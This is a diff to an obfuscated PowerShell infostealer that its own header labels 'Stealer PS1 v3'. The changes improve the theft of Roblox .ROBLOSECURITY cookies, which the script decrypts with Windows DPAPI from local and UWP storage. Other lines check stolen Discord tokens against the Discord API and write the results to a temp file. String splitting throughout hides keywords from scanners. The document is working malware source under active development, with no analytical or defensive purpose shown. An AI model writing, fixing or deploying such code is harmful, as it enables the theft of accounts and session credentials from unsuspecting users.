@@ -1,5 +1,4 @@
-# Stealer PS1 v2 - fixed string concatenation in Add-Content
-# Tags stored in variables to avoid PowerShell parsing issues
+# Stealer PS1 v3 — fixed regex: TAB not =
 
 Add-Type -AssemblyName System.Security
 $c0=@"
@@ -21,7 +20,6 @@ Add-Type -TypeDefinition $c0 -Language CSharp
 $f0=Join-Path $env:TEMP ("s"+"r.txt")
 Remove-Item $f0 -EA SilentlyContinue
 
-# Output tags (split for obfuscation)
 $tD="D"+"ISCORD"
 $tR="R"+"OBLO"+"X"
 $tRM="R"+"OBLO"+"XMS"
@@ -67,7 +65,7 @@ foreach($p1 in $d0){
     }
 }
 
-# Validate tokens and write output
+# Validate tokens
 foreach($t2 in $t0.Keys){
     try{
         $a0="http"+"s:/"+"/d"+"isc"+"ord.c"+"om/api/v9/users/@me"
@@ -79,7 +77,7 @@ foreach($t2 in $t0.Keys){
     }catch{}
 }
 
-# Roblox cookies
+# Roblox cookies — TAB separator, not =
 $rp0=@(
 ("$env:LOCALAPPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at")),
 ("$env:LOCALAPPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("R"+"obl"+"oxCo"+"okies.d"+"at")),
@@ -94,14 +92,14 @@ foreach($p2 in $rp0){
             $e1=[Convert]::FromBase64String($Matches[1])
             $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
             $c1=[Text.Encoding]::UTF8.GetString($d1)
-            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
-                $ck=$Matches[1]
-                if($ck -notmatch '^_'+'\|WA'+'RNI'+'NG'){$ck='_'+'|WA'+'RNI'+'NG:_'+$ck}
-                Add-Content $f0 "$tR|$ck"
-            }elseif($c1 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
-                Add-Content $f0 "$tR|$($Matches[0])"
+            # Netscape format: name<TAB>value — use TAB not =
+            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n\t]+)'){
+                Add-Content $f0 "$tR|$($Matches[1])"
+            }elseif($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
+                Add-Content $f0 "$tR|$($Matches[1])"
             }else{
-                Add-Content $f0 "$tR|$($c1.Substring(0,[Math]::Min(500,$c1.Length)))"
+                # Fallback: output raw (first 2000 chars)
+                Add-Content $f0 "$tR|$($c1.Substring(0,[Math]::Min(2000,$c1.Length)))"
             }
         }elseif($r2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')){
             Add-Content $f0 "$tR|$r2"
@@ -110,7 +108,7 @@ foreach($p2 in $rp0){
     break
 }
 
-# UWP Roblox
+# UWP Roblox — same TAB fix
 $p3="$env:LOCALAPPDATA\Pack"+"ages"
 if(Test-Path $p3){
     $g0=Get-ChildItem "$p3\RO"+"BLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
@@ -123,14 +121,12 @@ if(Test-Path $p3){
                 $e2=[Convert]::FromBase64String($Matches[1])
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
-                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
-                                $ck=$Matches[1]
-                                if($ck -notmatch '^_'+'\|WA'+'RNI'+'NG'){$ck='_'+'|WA'+'RNI'+'NG:_'+$ck}
-                                Add-Content $f0 "$tRM|$ck"
-                }elseif($c2 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
-                    Add-Content $f0 "$tRM|$($Matches[0])"
+                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n\t]+)'){
+                    Add-Content $f0 "$tRM|$($Matches[1])"
+                }elseif($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
+                    Add-Content $f0 "$tRM|$($Matches[1])"
                 }else{
-                    Add-Content $f0 "$tRM|$($c2.Substring(0,[Math]::Min(500,$c2.Length)))"
+                    Add-Content $f0 "$tRM|$($c2.Substring(0,[Math]::Min(2000,$c2.Length)))"
                 }
             }
         }catch{}
